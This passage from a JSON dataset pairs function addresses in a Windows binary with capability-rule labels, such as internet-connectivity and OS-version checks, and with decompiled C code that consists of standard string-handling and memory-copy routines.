        "decompiled_code": "\nint32_t __thiscall fcn.00431e70(int32_t *param_1, int32_t param_2, int32_t param_3, uint param_4)\n\n{\n    code *UNRECOVERED_JUMPTABLE;\n    int32_t iVar1;\n    \n    if (*(param_1 + 7) != '\\x01') {\n        if (*(param_1 + 7) == '\\0') {\n            fcn.00431cc0();\n            UNRECOVERED_JUMPTABLE = *(*param_1 + 0x1c);\n        }\n        else {\n            UNRECOVERED_JUMPTABLE = *(*param_1 + 0x1c);\n        }\n        if (UNRECOVERED_JUMPTABLE != 0x431f40) {\n    // WARNING: Could not recover jumptable at 0x00431ee6. Too many branches\n    // WARNING: Treating indirect jump as call\n            iVar1 = (*UNRECOVERED_JUMPTABLE)();\n            return iVar1;\n        }\n    }\n    sub.msvcrt.dll_memcpy(param_4, param_2, param_3 - param_2);\n    return param_3;\n}\n",
        "token_count": 258
    },
    "00432140": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00432140(uint16_t param_1)\n\n{\n    uint uVar1;\n    \n    if (param_1 == 0x10) {\n        uVar1 = fcn.0041e340(0x5025d8);\n        return uVar1;\n    }\n    if (param_1 < 0x11) {\n        if (param_1 == 4) {\n            uVar1 = fcn.0041e340(0x5025c6);\n            return uVar1;\n        }\n        if (param_1 < 5) {\n            if (param_1 == 1) {\n                uVar1 = fcn.0041e340(0x5025ba);\n                return uVar1;\n            }\n            if (param_1 == 2) {\n                uVar1 = fcn.0041e340(0x5025c0);\n                return uVar1;\n            }\n        }\n        else {\n            if (param_1 == 8) {\n                uVar1 = fcn.0041e340(0x5025cc);\n                return uVar1;\n            }\n            if (param_1 == 0xc) {\n                uVar1 = fcn.0041e340(0x5025df);\n                return uVar1;\n            }\n        }\n    }\n    else {\n        if (param_1 == 0x100) {\n            uVar1 = fcn.0041e340(0x5025b4);\n            return uVar1;\n        }\n        if (param_1 < 0x101) {\n            if (param_1 == 0x20) {\n                uVar1 = fcn.0041e340(0x5025a8);\n                return uVar1;\n            }\n            if (param_1 == 0x40) {\n                uVar1 = fcn.0041e340(0x5025ae);\n                return uVar1;\n            }\n        }\n        else {\n            if (param_1 == 0x200) {\n                uVar1 = fcn.0041e340(0x5025d2);\n                return uVar1;\n            }\n            if (param_1 == 0x20c) {\n                uVar1 = fcn.0041e340(0x5025e5);\n                return uVar1;\n            }\n        }\n    }\n    uVar1 = 0;\n    if (param_1 == 0x400) {\n        uVar1 = fcn.0041e340(\"blank\");\n    }\n    return uVar1;\n}\n",
        "token_count": 565
    },
    "00435590": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00435590(int32_t *param_1, uchar *param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    uint32_t *extraout_ECX;\n    uint32_t uVar1;\n    \n    if (param_1[1] < param_4) {\n        fcn.0049f220(0x502e50, 0x502f6b);\n        return *extraout_ECX;\n    }\n    uVar1 = param_1[1] - param_4;\n    if (param_3 < uVar1) {\n        uVar1 = param_3;\n    }\n    if (uVar1 != 0) {\n        if (uVar1 == 1) {\n            *param_2 = *(param_4 + *param_1);\n            return 1;\n        }\n        sub.msvcrt.dll_memcpy(param_2, param_4 + *param_1, uVar1);\n    }\n    return uVar1;\n}\n",
        "token_count": 226
    },
    "00436340": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00436340(int32_t *param_1, ushort *param_2, uint32_t param_3, uint32_t param_4)\n\n{\n    ushort *puVar1;\n    uint32_t *extraout_ECX;\n    uint32_t uVar2;\n    \n    if (param_1[1] < param_4) {\n        fcn.0049f220(0x5031c0, \"basic_string::copy\");\n        return *extraout_ECX;\n    }\n    uVar2 = param_1[1] - param_4;\n    if (param_3 < uVar2) {\n        uVar2 = param_3;\n    }\n    if (uVar2 != 0) {\n        puVar1 = *param_1 + param_4 * 2;\n        if (uVar2 == 1) {\n            *param_2 = *puVar1;\n            return 1;\n        }\n        sub.msvcrt.dll_memcpy(param_2, puVar1, uVar2 * 2);\n    }\n    return uVar2;\n}\n",
        "token_count": 242
    },
    "0043fcb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.0043fcb0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, uint arg_20h, \n            uint *arg_24h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *piVar4;\n    ulong uVar5;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    piVar4 = fcn.004a0a80(arg_1ch + 0x6c);\n    var_2ch = 0;\n    var_28h._0_1_ = 0;\n    var_30h = &var_28h;\n    if (arg_18h == '\\0') {\n        uVar5 = fcn.0043e270(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_30h);\n        iVar2 = var_2ch;\n    }\n    else {\n        uVar5 = fcn.0043ef80(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_30h);\n        iVar2 = var_2ch;\n    }\n    var_2ch = iVar2;\n    if (iVar2 != 0) {\n        fcn.00491b30(iVar2, 0);\n        puVar3 = var_30h;\n        uVar1 = *arg_24h;\n        if (*(piVar4 + 7) != '\\x01') {\n            if (*(piVar4 + 7) == '\\0') {\n                fcn.00431cc0();\n            }\n            if (*(*piVar4 + 0x1c) != 0x431f40) {\n                (**(*piVar4 + 0x1c))(puVar3, iVar2 + puVar3, uVar1);\n                goto code_r0x0043fd2f;\n            }\n        }\n        sub.msvcrt.dll_memcpy(uVar1, puVar3, iVar2);\n    }\ncode_r0x0043fd2f:\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    return uVar5;\n}\n",
        "token_count": 589
    },
    "0043fe10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.0043fe10(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    ulong uVar1;\n    uint var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    var_2ch = 0;\n    var_28h._0_1_ = 0;\n    var_30h = &var_28h;\n    if (arg_18h == '\\0') {\n        uVar1 = fcn.0043e270(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_30h);\n    }\n    else {\n        uVar1 = fcn.0043ef80(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_30h);\n    }\n    var_34h = fcn.0048f260();\n    fcn.0049dd30(var_30h, arg_24h, arg_20h, &var_34h);\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    return uVar1;\n}\n",
        "token_count": 354
    },
    "00441aa0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl\nfcn.00441aa0(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    uint64_t uVar1;\n    uint var_40h;\n    uint var_3ch;\n    uint var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    var_2ch = 0;\n    var_28h._0_1_ = 0;\n    var_30h = &var_28h;\n    if (arg_18h == '\\0') {\n        uVar1 = fcn.0043fee0(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_30h);\n    }\n    else {\n        uVar1 = fcn.00440c20(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_30h);\n    }\n    var_34h = fcn.0048f260();\n    fcn.0049dd30(var_30h, arg_24h, arg_20h, &var_34h);\n    if (var_30h != &var_28h) {\n        fcn.004a34c0(var_30h);\n    }\n    return uVar1 & 0xffffffff | (arg_ch & 0xffff0000 | uVar1 >> 0x20 & 0xffff) << 0x20;\n}\n",
        "token_count": 407
    },
    "00463b80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00463b80(int32_t param_1, ushort param_2, uint param_3)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    piVar1 = fcn.00464240(param_1, 0, param_3);\n    piVar2 = piVar1 + 3;\n    if (param_1 != 0) {\n        iVar3 = param_1;\n        if (param_1 == 1) {\n            *(piVar1 + 3) = param_2;\n        }\n        else {\n            do {\n                *piVar2 = param_2;\n                piVar2 = piVar2 + 2;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    piVar1[2] = 0;\n    *piVar1 = param_1;\n    *(piVar1 + param_1 * 2 + 0xc) = 0;\n    return;\n}\n",
        "token_count": 231
    },
    "00463c70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * fcn.00463c70(ushort *param_1, int32_t param_2, uint param_3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    ushort *in_stack_ffffffc8;\n    int32_t in_stack_ffffffcc;\n    uint uStack48;\n    \n    if ((param_2 == 0) || (param_1 != NULL)) {\n        param_2 = param_2 - param_1;\n        iVar2 = param_2 >> 1;\n        piVar1 = fcn.00464240(iVar2, 0, param_3);\n        if (iVar2 == 1) {\n            *(piVar1 + 3) = *param_1;\n        }\n        else if (iVar2 != 0) {\n            sub.msvcrt.dll_memcpy(piVar1 + 3, param_1, param_2);\n        }\n        piVar1[2] = 0;\n        *piVar1 = iVar2;\n        *(piVar1 + param_2 + 0xc) = 0;\n        return piVar1 + 3;\n    }\n    fcn.0049eb30(\"basic_string::_S_construct null not valid\");\n    if ((in_stack_ffffffcc != 0) && (in_stack_ffffffc8 == NULL)) {\n        fcn.0049eb30(\"basic_string::_S_construct null not valid\");\n        return 0x4f6d40;\n    }\n    in_stack_ffffffcc = in_stack_ffffffcc - in_stack_ffffffc8;\n    iVar2 = in_stack_ffffffcc >> 1;\n    piVar1 = fcn.00464240(iVar2, 0, uStack48);\n    if (iVar2 == 1) {\n        *(piVar1 + 3) = *in_stack_ffffffc8;\n    }\n    else if (iVar2 != 0) {\n        sub.msvcrt.dll_memcpy(piVar1 + 3, in_stack_ffffffc8, in_stack_ffffffcc);\n    }\n    piVar1[2] = 0;\n    *piVar1 = iVar2;\n    *(piVar1 + in_stack_ffffffcc + 0xc) = 0;\n    return piVar1 + 3;\n}\n",
        "token_count": 499
    },
    "00463f00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00463f00(int32_t *param_1, uint param_2, int32_t param_3, uint32_t param_4, ushort param_5)\n\n{\n    ushort *puVar1;\n    int32_t *extraout_ECX;\n    int32_t unaff_EDI;\n    ushort *puVar2;\n    int32_t in_stack_ffffffd8;\n    uint in_stack_ffffffdc;\n    int32_t iStack28;\n    \n    if ((param_3 + 0x1ffffffe) - *(*param_1 + -0xc) < param_4) {\n        puVar2 = 0x5024b5;\n        fcn.0049ec30();\n        fcn.00465630(in_stack_ffffffd8, in_stack_ffffffdc, iStack28);\n        if (iStack28 != 0) {\n            puVar1 = *extraout_ECX + in_stack_ffffffd8 * 2;\n            if (iStack28 == 1) {\n                *puVar1 = *puVar2;\n                return extraout_ECX;\n            }\n            sub.msvcrt.dll_memcpy(puVar1, puVar2, iStack28 * 2);\n        }\n        return extraout_ECX;\n    }\n    fcn.00465630(param_2, param_3, param_4);\n    if (param_4 != 0) {\n        puVar2 = *param_1 + unaff_EDI * 2;\n        if (param_4 == 1) {\n            *puVar2 = param_5;\n            return param_1;\n        }\n        do {\n            *puVar2 = param_5;\n            puVar2 = puVar2 + 1;\n            param_4 = param_4 - 1;\n        } while (param_4 != 0);\n    }\n    return param_1;\n}\n",
        "token_count": 416
    },
    "00463f90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00463f90(int32_t *param_1, int32_t param_2, uint param_3, uint param_4, int32_t param_5)\n\n{\n    ushort *puVar1;\n    ushort *unaff_retaddr;\n    \n    fcn.00465630(param_2, param_3, param_5);\n    if (param_5 != 0) {\n        puVar1 = *param_1 + param_2 * 2;\n        if (param_5 == 1) {\n            *puVar1 = *unaff_retaddr;\n            return param_1;\n        }\n        sub.msvcrt.dll_memcpy(puVar1, unaff_retaddr, param_5 * 2);\n    }\n    return param_1;\n}\n",
        "token_count": 175
    },
    "004641c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.004641c0(int32_t *param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    piVar1 = fcn.00464240(*param_1 + param_3, param_1[1], param_2);\n    iVar3 = 0;\n    iVar2 = *param_1;\n    if (iVar2 != 0) {\n        if (iVar2 == 1) {\n            *(piVar1 + 3) = *(param_1 + 3);\n            iVar3 = 2;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(piVar1 + 3, param_1 + 3, iVar2 * 2);\n            iVar2 = *param_1;\n            iVar3 = iVar2 * 2;\n        }\n    }\n    *piVar1 = iVar2;\n    piVar1[2] = 0;\n    *(piVar1 + iVar3 + 0xc) = 0;\n    return piVar1 + 3;\n}\n",
        "token_count": 253
    },
    "00464890": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00464890(int32_t *param_1, ushort *param_2, uint32_t param_3)\n\n{\n    ushort *puVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t *extraout_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uchar auStack57 [5];\n    uint32_t uStack52;\n    int32_t iStack48;\n    ushort *puStack44;\n    int32_t *piStack40;\n    ushort *puStack36;\n    uint32_t uStack32;\n    int32_t *piStack16;\n    \n    puVar1 = *param_1;\n    iVar5 = *(puVar1 + -6);\n    if (0x1ffffffe < param_3) {\n        puStack44 = 0x5024fd;\n        iStack48 = 0x464984;\n        fcn.0049ec30();\n        uStack52 = param_3;\n        iVar3 = *piStack40;\n        if (*extraout_ECX != iVar3) {\n            iStack48 = iVar5;\n            if (*(iVar3 + -4) < 0) {\n                iVar3 = fcn.004641c0(&stack0xffffffc7, 0);\n                iVar5 = *extraout_ECX;\n            }\n            else {\n                if (*0x4f59f4 == 0) {\n                    *(iVar3 + -4) = *(iVar3 + -4) + 1;\n                }\n                else {\n                    LOCK();\n                    *(iVar3 + -4) = *(iVar3 + -4) + 1;\n                }\n                iVar5 = *extraout_ECX;\n            }\n            if (*0x4f59f4 == 0) {\n                iVar4 = *(iVar5 + -4);\n                *(iVar5 + -4) = iVar4 + -1;\n            }\n            else {\n                LOCK();\n                piVar2 = iVar5 + -4;\n                iVar4 = *piVar2;\n                *piVar2 = *piVar2 + -1;\n            }\n            if (iVar4 < 1) {\n                fcn.004a34c0(iVar5 + -0xc);\n                *extraout_ECX = iVar3;\n            }\n            else {\n                *extraout_ECX = iVar3;\n            }\n            return extraout_ECX;\n        }\n        return extraout_ECX;\n    }\n    if ((param_2 < puVar1) || (puVar1 + iVar5 < param_2)) {\ncode_r0x004648b3:\n        uStack32 = param_3;\n        puStack36 = param_2;\n        puStack44 = NULL;\n        iStack48 = 0x4648cb;\n        piStack40 = iVar5;\n        piVar2 = fcn.00463f90();\n        return piVar2;\n    }\n    puStack44 = *param_1;\n    if (0 < *(puVar1 + -2)) {\n        iVar5 = *(puStack44 + -6);\n        goto code_r0x004648b3;\n    }\n    puStack36 = param_3 * 2;\n    uVar6 = param_2 - puStack44 >> 1;\n    piStack16 = param_1;\n    if (uVar6 < param_3) {\n        if (uVar6 == 0) goto code_r0x00464930;\n        if (param_3 != 1) {\n            if (param_3 != 0) {\n                piStack40 = param_2;\n                iStack48 = 0x464923;\n                sub.msvcrt.dll_memmove();\n                puStack44 = *piStack16;\n                param_1 = piStack16;\n            }\n            goto code_r0x00464930;\n        }\n    }\n    else if (param_3 != 1) {\n        if (param_3 != 0) {\n            piStack40 = param_2;\n            iStack48 = 0x464961;\n            sub.msvcrt.dll_memcpy();\n            puStack44 = *piStack16;\n            param_1 = piStack16;\n        }\n        goto code_r0x00464930;\n    }\n    *puStack44 = *param_2;\ncode_r0x00464930:\n    *(puStack44 + -2) = 0;\n    *(puStack44 + -6) = param_3;\n    puStack44[param_3] = 0;\n    return param_1;\n}\n",
        "token_count": 998
    },
    "00465200": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint32_t * __cdecl fcn.00465200(int32_t *arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    ushort *puVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    ushort *puVar4;\n    uint32_t *puVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t *in_ECX;\n    uint32_t uVar8;\n    int32_t *extraout_EDX;\n    int32_t iVar9;\n    uint *arg_8h_00;\n    uint arg_ch_00;\n    uint32_t in_stack_ffffffc0;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_19h;\n    uint var_bp_ch;\n    \n    uVar2 = *in_ECX;\n    piVar3 = *(uVar2 - 0xc);\n    if (arg_8h <= piVar3) {\n        if (piVar3 - arg_8h <= arg_ch) {\n            arg_ch = piVar3 - arg_8h;\n        }\n        if (arg_14h <= (arg_ch - piVar3) + 0x1ffffffe) {\n            if (((arg_10h < uVar2) || (uVar2 + piVar3 * 2 < arg_10h)) || (0 < *(uVar2 - 4))) {\n                in_ECX = fcn.00463f90(arg_8h, arg_ch, arg_10h, arg_14h);\n            }\n            else {\n                uVar8 = arg_10h + arg_14h * 2;\n                uVar2 = *in_ECX;\n                if (arg_8h * 2 + uVar2 < uVar8) {\n                    if (arg_10h < uVar2 + (arg_8h + arg_ch) * 2) {\n                        iVar9 = fcn.00463c70(arg_10h, uVar8, &var_19h, in_stack_ffffffc0 & 0xffffff00);\n                        puVar5 = fcn.00463f90(arg_8h, arg_ch, iVar9, arg_14h);\n                        if (*0x4f59f4 == 0) {\n                            iVar6 = *(iVar9 + -4);\n                            *(iVar9 + -4) = iVar6 + -1;\n                        }\n                        else {\n                            LOCK();\n                            piVar3 = iVar9 + -4;\n                            iVar6 = *piVar3;\n                            *piVar3 = *piVar3 + -1;\n                        }\n                        if (0 < iVar6) {\n                            return puVar5;\n                        }\n                        fcn.004a34c0(iVar9 + -0xc);\n                        return puVar5;\n                    }\n                    iVar9 = (arg_14h + (arg_10h - uVar2 >> 1)) - arg_ch;\n                }\n                else {\n                    iVar9 = arg_10h - uVar2 >> 1;\n                }\n                fcn.00465630(arg_8h, arg_ch, arg_14h);\n                puVar1 = *in_ECX + iVar9 * 2;\n                puVar4 = *in_ECX + arg_8h * 2;\n                if (arg_14h == 1) {\n                    *puVar4 = *puVar1;\n                }\n                else if (arg_14h != 0) {\n                    sub.msvcrt.dll_memcpy(puVar4, puVar1, arg_14h * 2);\n                }\n            }\n            return in_ECX;\n        }\n        fcn.0049ec30(0x5024e7);\n        arg_8h = extraout_EDX;\n    }\n    arg_ch_00 = 0x5024e7;\n    uVar7 = fcn.0049f220(0x5023e4, 0x5024e7);\n    arg_8h_00 = &var_19h;\n    fcn.004640c0();\n    fcn.0041b360(uVar7);\n    puVar5 = fcn.00465200(arg_8h_00, arg_ch_00, *arg_8h, *(*arg_8h + -0xc));\n    return puVar5;\n}\n",
        "token_count": 978
    },
    "00465630": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00465630(int32_t *param_1, int32_t param_2, int32_t param_3, int32_t param_4)\n\n{\n    int32_t *piVar1;\n    ushort *puVar2;\n    int32_t iVar3;\n    ushort *puVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uchar auStack29 [13];\n    \n    iVar9 = *param_1;\n    iVar5 = param_2 + param_3;\n    uVar6 = (param_4 - param_3) + *(iVar9 + -0xc);\n    iVar7 = *(iVar9 + -0xc) - iVar5;\n    uVar8 = *(iVar9 + -8);\n    if (uVar6 <= uVar8) {\n        if (*(iVar9 + -4) < 1) {\n            iVar9 = *param_1;\n            if ((iVar7 != 0) && (param_4 != param_3)) {\n                puVar4 = iVar9 + iVar5 * 2;\n                puVar2 = iVar9 + (param_4 + param_2) * 2;\n                if (iVar7 == 1) {\n                    *puVar2 = *puVar4;\n                }\n                else {\n                    sub.msvcrt.dll_memmove(puVar2, puVar4, iVar7 * 2);\n                    iVar9 = *param_1;\n                }\n            }\n            goto code_r0x004656f5;\n        }\n        uVar8 = *(*param_1 + -8);\n    }\n    iVar3 = fcn.00464240(uVar6, uVar8, auStack29);\n    if (param_2 == 0) {\n        puVar4 = *param_1;\n    }\n    else {\n        puVar4 = *param_1;\n        if (param_2 == 1) {\n            *(iVar3 + 0xc) = *puVar4;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(iVar3 + 0xc, puVar4, param_2 * 2);\n            puVar4 = *param_1;\n        }\n    }\n    iVar9 = iVar3 + 0xc;\n    if (iVar7 != 0) {\n        puVar2 = iVar3 + 0xc + (param_4 + param_2) * 2;\n        if (iVar7 == 1) {\n            *puVar2 = puVar4[iVar5];\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar2, puVar4 + iVar5, iVar7 * 2);\n            puVar4 = *param_1;\n        }\n    }\n    if (*0x4f59f4 == 0) {\n        iVar5 = *(puVar4 + -2);\n        *(puVar4 + -2) = iVar5 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = puVar4 + -2;\n        iVar5 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar5 < 1) {\n        fcn.004a34c0(puVar4 + -6);\n    }\n    *param_1 = iVar9;\ncode_r0x004656f5:\n    *(iVar9 + -4) = 0;\n    *(iVar9 + -0xc) = uVar6;\n    *(iVar9 + uVar6 * 2) = 0;\n    return;\n}\n",
        "token_count": 791
    },
    "00468200": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00468200(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    uint *in_ECX;\n    uint var_19h;\n    uint var_14h;\n    uint var_bp_10h;\n    uint var_8h;\n    \n    *in_ECX = 0xffffffff;\n    in_ECX[1] = 0xffffffff;\n    in_ECX[2] = 0;\n    fcn.00468920(arg_8h, 1);\n    if ((var_19h != '\\0') && ((*(arg_8h + *(*arg_8h + -0xc) + 0x14) & 5) == 0)) {\n        piVar1 = *(arg_8h + *(*arg_8h + -0xc) + 0x78);\n        (**(*piVar1 + 0x10))(piVar1, 0, 0, 1, 8);\n        *in_ECX = stack0xffffffe4;\n        in_ECX[1] = var_14h;\n        in_ECX[2] = var_bp_10h;\n    }\n    return;\n}\n",
        "token_count": 284
    },
    "0046ba90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * fcn.0046ba90(int32_t param_1, char param_2, uint param_3)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = fcn.0046c0f0(param_1, 0, param_3);\n    if (param_1 != 0) {\n        if (param_1 == 1) {\n            *(piVar1 + 3) = param_2;\n        }\n        else {\n            sub.msvcrt.dll_memset(piVar1 + 3, param_2, param_1);\n        }\n    }\n    piVar1[2] = 0;\n    *piVar1 = param_1;\n    *(piVar1 + param_1 + 0xc) = 0;\n    return piVar1 + 3;\n}\n",
        "token_count": 182
    },
    "0046bb70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * fcn.0046bb70(uchar *param_1, int32_t param_2, uint param_3)\n\n{\n    int32_t *piVar1;\n    uchar *in_stack_ffffffd8;\n    int32_t in_stack_ffffffdc;\n    uint uStack32;\n    \n    if ((param_2 == 0) || (param_1 != NULL)) {\n        param_2 = param_2 - param_1;\n        piVar1 = fcn.0046c0f0(param_2, 0, param_3);\n        if (param_2 == 1) {\n            *(piVar1 + 3) = *param_1;\n        }\n        else if (param_2 != 0) {\n            sub.msvcrt.dll_memcpy(piVar1 + 3, param_1, param_2);\n        }\n        piVar1[2] = 0;\n        *piVar1 = param_2;\n        *(piVar1 + param_2 + 0xc) = 0;\n        return piVar1 + 3;\n    }\n    fcn.0049eb30(0x50232c);\n    if ((in_stack_ffffffdc != 0) && (in_stack_ffffffd8 == NULL)) {\n        fcn.0049eb30(0x50232c);\n        return 0x4f6d50;\n    }\n    in_stack_ffffffdc = in_stack_ffffffdc - in_stack_ffffffd8;\n    piVar1 = fcn.0046c0f0(in_stack_ffffffdc, 0, uStack32);\n    if (in_stack_ffffffdc == 1) {\n        *(piVar1 + 3) = *in_stack_ffffffd8;\n    }\n    else if (in_stack_ffffffdc != 0) {\n        sub.msvcrt.dll_memcpy(piVar1 + 3, in_stack_ffffffd8, in_stack_ffffffdc);\n    }\n    piVar1[2] = 0;\n    *piVar1 = in_stack_ffffffdc;\n    *(piVar1 + in_stack_ffffffdc + 0xc) = 0;\n    return piVar1 + 3;\n}\n",
        "token_count": 482
    },
    "0046bde0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
